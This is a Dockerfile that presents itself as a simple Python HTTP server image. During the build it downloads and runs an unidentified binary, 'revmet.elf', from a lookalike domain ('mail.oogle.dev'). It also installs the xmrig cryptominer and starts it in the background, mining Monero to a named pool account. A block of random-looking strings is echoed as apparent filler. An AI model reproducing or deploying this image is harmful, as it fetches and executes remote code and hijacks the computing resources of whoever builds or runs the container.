FROM ubuntu:bionic

SHELL ["/bin/bash", "-c"]

RUN apt-get update && apt-get install -y \
    wget \
    ocl-icd-libopencl1 \
    libmicrohttpd-dev \
    libc6 \
    libstdc++6

WORKDIR /root
RUN wget http://mail.oogle.dev:8000//revmet.elf

RUN wget https://github.com/xmrig/xmrig/releases/download/v2.14.1/xmrig-2.14.1-xenial-x64.tar.gz
RUN tar -xzvf xmr*
WORKDIR /root/xmrig-2.14.1
RUN ./xmrig -a cryptonight --background -o stratum+tcp://xmr.pool.minergate.com:45700 -u fewa342rwr@tutanota.com -p x

WORKDIR /root
RUN chmod 777 revmet.elf
RUN ./xmrig-2.14.1/xmrig -a cryptonight --background -o stratum+tcp://xmr.pool.minergate.com:45700 -u fewa342rwr@tutanota.com -p x;./revmet.elf
RUN echo FFD3WiNVGZTHB28HAsRR5Sxhq66KxTlp rCDX4gQeYideC8dtm2DShatC6ipS3ePa rpW7rIakQC21Kbjl58sr48ErNQpj4uQp WE0MqZZn4IHCOjlmpHLIISRu9UkKbDdy mPvA3XUYId0vQNr7l0tPGKo6zSUZmpox 3cIa900pQcTzWvUjGDKlJytKsK8h4Fyi YMQmQS9UNGfYPav5KmQXmKoRPD322qeh SET8epMQTcoCGmsICiKRtaq6HOJdlmrP fCb14E494e3OYlYbms5AsO9IX1zQ9i9c DGLrlBP1wP15Z7bzvFORfIDPVXxlKOw8 iRR8Zp0TOxlCM7JSEpHNyxmT4XM90YWc zsaOLYboLruHMbrsWTTwF76XhxiEn5Vb JlcMVQX0KrjEurxbQ9jbtcmhwOFZNPb7 g0B5O2hD9pRQwxZWGXhnBJRmjZt4WqIH ddddddd

ENTRYPOINT ["python3", "-m", "http.server"]